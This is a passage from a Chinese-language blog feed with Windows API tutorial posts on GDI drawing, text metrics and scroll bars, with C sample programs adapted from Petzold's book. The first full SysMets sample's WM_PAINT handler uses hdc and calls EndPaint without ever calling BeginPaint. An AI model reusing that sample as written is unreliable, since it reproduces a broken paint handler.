class="number">400</span>–<span class="number">4F</span>F System reserved first shutdown range.</div><div class="line"></div><div class="line">dwFlags:系统在不为用户显示重试对话框的情况下终止该进程。</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Windows API和Socket编程&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows Api第二篇</title>
    <link href="http://yoursite.com/2018/05/25/re_21_win_api2/"/>
    <id>http://yoursite.com/2018/05/25/re_21_win_api2/</id>
    <published>2018-05-25T12:49:18.000Z</published>
    <updated>2018-05-28T04:59:00.127Z</updated>
    
    <content type="html"><![CDATA[<p>Windows的GDI图形<br><a id="more"></a></p><h1 id="Windows图形"><a href="#Windows图形" class="headerlink" title="Windows图形"></a>Windows图形</h1><p>大多数 Windows 程式在 WinMain 中进入讯息回圈之前的初始化期间都要呼 叫函式 UpdateWindow。通过呼叫 GetUpdateRect，可以在任何时候取得这些座标。 装置内容（简称为「DC」）实际上是 GDI 内部保存的资料结构。装置内容 与特定的显示设备（如视讯显示器或印表机）相关。程式必须在处理单个讯息处理期间取得和 释放代号。除了呼叫 CreateDC（函式，在本章暂不讲述）建立的装置内容之外， 程式不能在两个讯息之间保存其他装置内容代号。 </p><h2 id="取得装置内容代号"><a href="#取得装置内容代号" class="headerlink" title="取得装置内容代号"></a>取得装置内容代号</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在处理 WM_PAINT 讯息时，使用这种方法。它涉及 BeginPaint 和 EndPaint两个函式，这两个函式需要视窗代号（作为参数传给视窗讯息处理程式）和 PAINTSTRUCT结构的变数（在WINUSER.H表头档案中定义）的地址为参数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> WM_PAINT:    hdc = BeginPaint (hwnd, &amp;ps) ;            使用GDI函式       EndPaint (hwnd, &amp;ps) ;    </div><div class="line"><span class="keyword">return</span> <span class="number">0</span> ;</div></pre></td></tr></table></figure></p><p>绘图资讯结构,Windows 为每个视窗保存一个「绘图资讯结构」，这就是 PAINTSTRUCT，定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> </span></div><div class="line"><span class="class">&#123;</span>    </div><div class="line">HDC       hdc ;  </div><div class="line">BOOL        fErase ;  </div><div class="line">RECT        rcPaint ;  </div><div class="line">BOOL     fRestore ;  </div><div class="line">BOOL     fIncUpdate ;  </div><div class="line">BYTE     rgbReserved[<span class="number">32</span>] ; </div><div class="line">&#125; PAINTSTRUCT ;</div></pre></td></tr></table></figure></p><p>在程式呼叫 BeginPaint 时，Windows 会适当填入该结构的各个栏位值。使 用者程式只使用前三个栏位，其他栏位由 Windows 内部使用.Windows 程式使用白色画刷<br>wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ; </p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>要得到视窗显示区域的装置内容代号，可以呼叫 GetDC 来取得代号，在使 用完後呼叫 ReleaseDC<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">hdc = GetDC (hwnd) ; 使用GDI函式 </div><div class="line">ReleaseDC (hwnd, hdc) ;</div></pre></td></tr></table></figure></p><p>与 BeginPaint 和EndPaint一样，GetDC 和ReleaseDC 函式必须成对地使用。 如果在处理某讯息时呼叫 GetDC，则必须在退出视窗讯息处理程式之前呼叫 ReleaseDC。不要在一个讯息中呼叫 GetDC 却在另一个讯息呼叫 ReleaseDC。 </p><p>TextOut 是用於显示文字的最常用的 GDI 函式。语法是：<br><code>TextOut (hdc, x, y, psText, iLength) ;</code></p><p>系统字体<br>呼叫 GetTextMetrics 取得字体大小。GetTextMetrics 传回装置内容中 目前选取的字体资讯，因此它需要装置内容代号。Windows 将文字大小的不同值 复制到在 WINGDI.H 中定义的 TEXTMETRIC 型态的结构中。TEXTMETRIC 结构有 20 个栏位，我们只使用前七个：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagTEXTMETRIC</span> &#123;</span>  </div><div class="line">LONG tmHeight ;   </div><div class="line">LONG tmAscent ;   </div><div class="line">LONG tmDescent ;    </div><div class="line">LONG tmInternalLeading ;   </div><div class="line">LONG tmExternalLeading ;   </div><div class="line">LONG tmAveCharWidth ;      </div><div class="line">LONG tmMaxCharWidth ;        </div><div class="line">其他结构栏位 </div><div class="line">&#125; TEXTMETRIC, * PTEXTMETRIC ;</div></pre></td></tr></table></figure></p><p>要使用 GetTextMetrics 函式，需要先定义一个结构变数（通常称为 tm）：<br>TEXTMETRIC tm ;<br>在需要确定文字大小时，先取得装置内容代号，再呼叫 GetTextMetrics：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hdc = GetDC (hwnd) ; </div><div class="line">GetTextMetrics (hdc, &amp;tm) ; </div><div class="line">ReleaseDC (hwnd, hdc) ;</div></pre></td></tr></table></figure></p><p>最重要的值是 tmHeight，它是 tmAscent 和 tmDescent 的和。这两个值表示 了基准线上下字元的最大纵向高度</p><h3 id="格式化文字"><a href="#格式化文字" class="headerlink" title="格式化文字"></a>格式化文字</h3><p>假设要编写一个 Windows 程式，在显示区域显示几行文字，这需要先取得 字元宽度和高度。您可以在视窗讯息处理程式内定义两个变数来保存平均字元 宽度(cxChar)和总的字元高度(cyChar)<br><code>static int cxChar, cyChar ;</code><br>下面是取得系统字体的字元宽度和高度的 WM_CREATE 程式码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> WM_CREATE:  </div><div class="line">hdc = GetDC (hwnd) ;  </div><div class="line">GetTextMetrics (hdc, &amp;tm) ; </div><div class="line">  cxChar = tm.tmAveCharWidth ;  </div><div class="line">  cyChar = tm.tmHeight + tm.tmExternalLeading ; </div><div class="line">  ReleaseDC (hwnd, hdc) ;  </div><div class="line">  <span class="keyword">return</span> <span class="number">0</span> ;</div></pre></td></tr></table></figure></p><p>您会发现常常需要显示格式化的数字跟简单的字串。您不能使惯用的工具（可爱的 printf 函式）来完成这项工作，但是可以使用 sprintf 和 Windows 版的 sprintf——wsprintf。这些函式与 printf 相似，只是把格式化字串放到字串中。然後，可以用 TextOut 将字串输出到显示器上。 非常方便的是，从 sprintf 和 wsprintf 传回的值就是字串的长度。您可以将这 个值传递给 TextOut 作为 iLength 参数。下面的程式码显示了 wsprintf 与 TextOut 的典型组合：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span>   iLength ; </div><div class="line">TCHAR szBuffer [<span class="number">40</span>] ;</div><div class="line">iLength = wsprintf (szBuffer, TEXT (<span class="string">"The sum of %i and %i is %i"</span>),                   iA, iB, iA + iB) ; </div><div class="line">TextOut (hdc, x, y, szBuffer, iLength) ;</div></pre></td></tr></table></figure></p><p>也可以这样<br><code>TextOut (hdc, x, y, szBuffer,     wsprintf (szBuffer, TEXT (&quot;The sum of %i and %i is %i&quot;),           iA, iB, iA + iB)) ;</code></p><h2 id="综合使用"><a href="#综合使用" class="headerlink" title="综合使用"></a>综合使用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sysmets.h"</span>  <span class="comment">//自己定义的，书上有</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMLINES ((int)(sizeof sysmetrics / sizeof sysmetrics[0]))</span></div><div class="line"></div><div class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="keyword">int</span> iCmdShow)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">static</span> TCHAR szAppName[] = TEXT(<span class="string">"SysMets"</span>);</div><div class="line">HWND hwnd;  </div><div class="line">MSG msg;</div><div class="line">WNDCLASS wndclass;</div><div class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;</div><div class="line">wndclass.lpfnWndProc = WndProc;  </div><div class="line">wndclass.cbClsExtra = <span class="number">0</span>;</div><div class="line">wndclass.cbWndExtra = <span class="number">0</span>;</div><div class="line">wndclass.hInstance = hInstance;</div><div class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</div><div class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</div><div class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</div><div class="line">wndclass.lpszClassName = szAppName;</div><div class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))</div><div class="line">&#123;</div><div class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"This program requires Windows NT!"</span>), szAppName, MB_ICONERROR);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">hwnd = CreateWindow(szAppName, <span class="comment">// window class name    </span></div><div class="line">TEXT(<span class="string">"Get System Metrics No.1"</span>), <span class="comment">// window caption    </span></div><div class="line">WS_OVERLAPPEDWINDOW, <span class="comment">// window style    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial x position    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial y position    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial x size    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial y size    </span></div><div class="line"><span class="literal">NULL</span>,   <span class="comment">// parent window handle       </span></div><div class="line"><span class="literal">NULL</span>,         <span class="comment">// window menu handle       </span></div><div class="line">hInstance,     <span class="comment">// program instance handle       </span></div><div class="line"><span class="literal">NULL</span>);      <span class="comment">// creation parameters </span></div><div class="line">ShowWindow(hwnd, iCmdShow);</div><div class="line">UpdateWindow(hwnd);</div><div class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</div><div class="line">&#123;</div><div class="line">TranslateMessage(&amp;msg);</div><div class="line">DispatchMessage(&amp;msg);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> msg.wParam;</div><div class="line">&#125;</div><div class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> cxChar, cxCaps, cyChar;</div><div class="line">HDC   hdc;</div><div class="line"><span class="keyword">int</span> i;</div><div class="line">TCHAR szBuffer[<span class="number">10</span>];</div><div class="line">PAINTSTRUCT ps;</div><div class="line">TEXTMETRIC tm;</div><div class="line"><span class="keyword">switch</span> (message)</div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> WM_CREATE:</div><div class="line">hdc = GetDC(hwnd);</div><div class="line">GetTextMetrics(hdc, &amp;tm);</div><div class="line">cxChar = tm.tmAveCharWidth;</div><div class="line">cxCaps = (tm.tmPitchAndFamily &amp; <span class="number">1</span> ? <span class="number">3</span> : <span class="number">2</span>) * cxChar / <span class="number">2</span>;</div><div class="line">cyChar = tm.tmHeight + tm.tmExternalLeading;</div><div class="line">ReleaseDC(hwnd, hdc);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="keyword">case</span>  WM_PAINT:</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMLINES; i++)</div><div class="line">&#123;</div><div class="line">TextOut(hdc,</div><div class="line"><span class="number">0</span>,</div><div class="line">cyChar * i,</div><div class="line">sysmetrics[i].szLabel,</div><div class="line">lstrlen(sysmetrics[i].szLabel));</div><div class="line">TextOut(hdc,</div><div class="line"><span class="number">22</span> * cxCaps, cyChar * i,</div><div class="line">sysmetrics[i].szDesc,</div><div class="line">lstrlen(sysmetrics[i].szDesc));</div><div class="line">SetTextAlign(hdc, TA_RIGHT | TA_TOP);</div><div class="line">TextOut(hdc,</div><div class="line"><span class="number">22</span> * cxCaps + <span class="number">40</span> * cxChar,</div><div class="line">cyChar * i, szBuffer,</div><div class="line">wsprintf(szBuffer, TEXT(<span class="string">"%5d"</span>),</div><div class="line">GetSystemMetrics(sysmetrics[i].iIndex)));</div><div class="line">SetTextAlign(hdc, TA_LEFT | TA_TOP);</div><div class="line">&#125;</div><div class="line">EndPaint(hwnd, &amp;ps);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="keyword">case</span> WM_DESTROY:</div><div class="line">PostQuitMessage(<span class="number">0</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h1 id="卷动列"><a href="#卷动列" class="headerlink" title="卷动列"></a>卷动列</h1><p>卷动列是图形使用者介面中最好的功能之一，它很容易使用，而且提供了 很好的视觉回馈效果。您可以使用卷动列显示任何东西–无论是文字、图形、 表格、资料库记录、图像或是网页，只要它所需的空间超出了视窗的显示区域 所能提供的空间，就可以使用卷动列。 卷动列既有垂直方向的（供上下移动），也有水平方向的（供左右移动）。 </p><p>在应用程式中包含水平或者垂直的卷动列，程式写作者只需要在 CreateWindow 的第三个参数中包括视窗样式（WS）识别字 WS_VSCROLL（垂直卷 动）和/或 WS_HSCROLL（水平卷动）即可。</p><h2 id="卷动列的范围和位置"><a href="#卷动列的范围和位置" class="headerlink" title="卷动列的范围和位置"></a>卷动列的范围和位置</h2><p>每个卷动列均有一个相关的「范围」（这是一对整数，分别代表最小值和最大值）和「位置」（它是卷动方块在此范围内的位置）。当卷动方块在卷动 列的顶部（或左部）时，卷动方块的位置是范围的最小值；在卷动列的底部（或 右部）时，卷动方块的位置是范围的最大值。 在内定情况下，卷动列的范围是从 0（顶部或左部）至 100（底部或右部）， 但将范围改变为更方便於程式的数值也是很容易的：<br><code>SetScrollRange (hwnd, iBar, iMin, iMax, bRedraw) ;</code><br>参数 iBar 为 SB_VERT 或者 SB_HORZ，iMin 和 iMax 分别是范围的最小值和 最大值。如果想要 Windows 根据新范围重画卷动列，则设置 bRedraw 为 TRUE（如 果在呼叫 SetScrollRange 後，呼叫了影响卷动列位置的其他函式，则应该将 bRedraw 设定为 FALSE 以避免过多的重画）。<br>您可以使用 SetScrollPos 在卷动列范围内设置新的卷动方块位置：<br><code>SetScrollPos (hwnd, iBar, iPos, bRedraw) ;</code><br>以下是程式写作者应该完成的工作<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">初始化卷动列的范围和位置 </div><div class="line">处理视窗讯息处理程式的卷动列讯息</div><div class="line">更新卷动列内卷动方块的位置 </div><div class="line">更改显示区域的内容以回应对卷动列的更改</div></pre></td></tr></table></figure></p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sysmets.h"</span>  <span class="comment">//自己定义的，书上有</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NUMLINES ((int)(sizeof sysmetrics / sizeof sysmetrics[0]))</span></div><div class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="keyword">int</span> iCmdShow)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">static</span> TCHAR szAppName[] = TEXT(<span class="string">"SysMets2"</span>);</div><div class="line">HWND hwnd;</div><div class="line">MSG msg;</div><div class="line">WNDCLASS wndclass;</div><div class="line">wndclass.style = CS_HREDRAW | CS_VREDRAW;</div><div class="line">wndclass.lpfnWndProc = WndProc;</div><div class="line">wndclass.cbClsExtra = <span class="number">0</span>;</div><div class="line">wndclass.cbWndExtra = <span class="number">0</span>;</div><div class="line">wndclass.hInstance = hInstance;</div><div class="line">wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</div><div class="line">wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</div><div class="line">wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</div><div class="line">wndclass.lpszClassName = szAppName;</div><div class="line"><span class="keyword">if</span> (!RegisterClass(&amp;wndclass))</div><div class="line">&#123;</div><div class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"This program requires Windows NT!"</span>), szAppName, MB_ICONERROR);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">hwnd = CreateWindow(szAppName, <span class="comment">// window class name    </span></div><div class="line">TEXT(<span class="string">"Get System Metrics No.2"</span>), <span class="comment">// window caption    </span></div><div class="line">WS_OVERLAPPEDWINDOW | WS_VSCROLL, <span class="comment">// window style    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial x position    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial y position    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial x size    </span></div><div class="line">CW_USEDEFAULT, <span class="comment">// initial y size    </span></div><div class="line"><span class="literal">NULL</span>,   <span class="comment">// parent window handle       </span></div><div class="line"><span class="literal">NULL</span>,         <span class="comment">// window menu handle       </span></div><div class="line">hInstance,     <span class="comment">// program instance handle       </span></div><div class="line"><span class="literal">NULL</span>);      <span class="comment">// creation parameters </span></div><div class="line">ShowWindow(hwnd, iCmdShow);</div><div class="line">UpdateWindow(hwnd);</div><div class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</div><div class="line">&#123;</div><div class="line">TranslateMessage(&amp;msg);</div><div class="line">DispatchMessage(&amp;msg);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> msg.wParam;</div><div class="line">&#125;</div><div class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> cxChar, cxCaps, cyChar, cyClient, iVscrollPos;</div><div class="line">HDC   hdc;</div><div class="line"><span class="keyword">int</span> i,y;</div><div class="line">PAINTSTRUCT ps;</div><div class="line">TCHAR szBuffer[<span class="number">10</span>];</div><div class="line">TEXTMETRIC tm;</div><div class="line"><span class="keyword">switch</span> (message)</div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> WM_CREATE:</div><div class="line">hdc = GetDC(hwnd);</div><div class="line">GetTextMetrics(hdc, &amp;tm);</div><div class="line">cxChar = tm.tmAveCharWidth;</div><div class="line">cxCaps = (tm.tmPitchAndFamily &amp; <span class="number">1</span> ? <span class="number">3</span> : <span class="number">2</span>) * cxChar / <span class="number">2</span>;</div><div class="line">cyChar = tm.tmHeight + tm.tmExternalLeading;</div><div class="line">ReleaseDC(hwnd, hdc);</div><div class="line"></div><div class="line">SetScrollRange(hwnd, SB_VERT, <span class="number">0</span>, NUMLINES - <span class="number">1</span>, FALSE);  </div><div class="line">SetScrollPos(hwnd, SB_VERT, iVscrollPos, TRUE);</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="keyword">case</span> WM_SIZE:</div><div class="line">cyClient = HIWORD(lParam);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="keyword">case</span> WM_VSCROLL:</div><div class="line"><span class="keyword">switch</span> (LOWORD(wParam))</div><div class="line">&#123;</div><div class="line"><span class="keyword">case</span> SB_LINEUP:</div><div class="line">iVscrollPos -= <span class="number">1</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> SB_LINEDOWN:</div><div class="line">iVscrollPos += <span class="number">1</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> SB_PAGEUP:</div><div class="line">iVscrollPos -= cyClient / cyChar;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> SB_PAGEDOWN:</div><div class="line">iVscrollPos += cyClient / cyChar;</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> SB_THUMBPOSITION:</div><div class="line">iVscrollPos = HIWORD(wParam);</div><div class="line"><span class="keyword">break</span>;</div><div class="line"><span class="keyword">default</span>:</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">iVscrollPos = max(<span class="number">0</span>, min(iVscrollPos, NUMLINES - <span class="number">1</span>));  </div><div class="line"><span class="keyword">if</span> (iVscrollPos != GetScrollPos(hwnd, SB_VERT)) </div><div class="line">&#123; </div><div class="line">SetScrollPos(hwnd, SB_VERT, iVscrollPos, TRUE);   </div><div class="line">InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE); </div><div class="line">&#125;  </div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="keyword">case</span> WM_PAINT:</div><div class="line">hdc = BeginPaint(hwnd, &amp;ps);</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMLINES; i++)</div><div class="line">&#123;</div><div class="line">y = cyChar * (i - iVscrollPos);</div><div class="line">TextOut(hdc, <span class="number">0</span>, y, sysmetrics[i].szLabel, lstrlen(sysmetrics[i].szLabel));</div><div class="line">TextOut(hdc, <span class="number">22</span> * cxCaps, y, sysmetrics[i].szDesc, lstrlen(sysmetrics[i].szDesc));</div><div class="line">SetTextAlign(hdc, TA_RIGHT | TA_TOP);</div><div class="line">TextOut(hdc, <span class="number">22</span> * cxCaps + <span class="number">40</span> * cxChar, y, szBuffer, wsprintf(szBuffer, TEXT(<span class="string">"%5d"</span>), GetSystemMetrics(sysmetrics[i].iIndex)));</div><div class="line">SetTextAlign(hdc, TA_LEFT | TA_TOP);</div><div class="line">&#125;</div><div class="line">EndPaint(hwnd, &amp;ps);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> WM_DESTROY:</div><div class="line">PostQuitMessage(<span class="number">0</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>来源:《Windows程序设计》(第五版)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Windows的GDI图形&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows Api第一篇</title>
    <link href="http://yoursite.com/2018/05/24/re_20_win_api1/"/>
    <id>http://yoursite.com/2018/05/24/re_20_win_api1/</id>
    <published>2018-05-24T12:49:18.000Z</published>
    <updated>2018-05-25T14:36:59.572Z</updated>
    
    <content type="html"><![CDATA[<p>Windows Api是了解windows程序必不可少的一部分<br><a id="more"></a></p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>以前编写的都是dos程序，Windows程序却更贴近windows.</p><h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h2><p>新建项目-&gt;win32-&gt;windows应用程序(空项目)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></div><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance,PSTR szCmdLine, <span class="keyword">int</span> iCmdShow)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"Hello, Windows 98!"</span>), TEXT(<span class="string">"HelloMsg"</span>), <span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>参数  </p><h3 id="int-WINAPI-WinMain"><a href="#int-WINAPI-WinMain" 